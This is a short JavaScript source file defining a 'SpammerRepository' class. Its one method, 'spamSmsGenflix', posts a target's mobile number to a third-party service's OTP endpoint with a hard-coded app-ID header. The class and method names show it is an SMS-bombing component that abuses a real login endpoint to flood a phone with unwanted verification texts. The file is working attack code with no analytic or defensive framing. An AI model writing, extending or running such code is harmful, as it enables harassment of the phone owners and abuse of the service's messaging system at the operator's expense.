import { SafeApiRequest } from '../networks/safe_api_request'

export class SpammerRepository extends SafeApiRequest {
  constructor() {
    super()
    if (SpammerRepository._instance) {
      return SpammerRepository._instance
    }
    SpammerRepository._instance = this;
    const _prefixUrl = '/api/v1/spam'
    this.getPrefixUrl = function() {
      return _prefixUrl
    }
  }


  async spamSmsGenflix(controller, mobile) {
    return this.apiRequest(this.framebyteApi().post(`https://d3l63rih9mbuez.cloudfront.net/user/v1.0/sessions/otp`, {
      mobile: mobile
    }, {
      headers: {
        'Cloudfront-JWT-AppId': 'a597d124-03e7-43e6-8435-13d667c13c15'
      },
      signal: controller.signal,
    }))
  }

}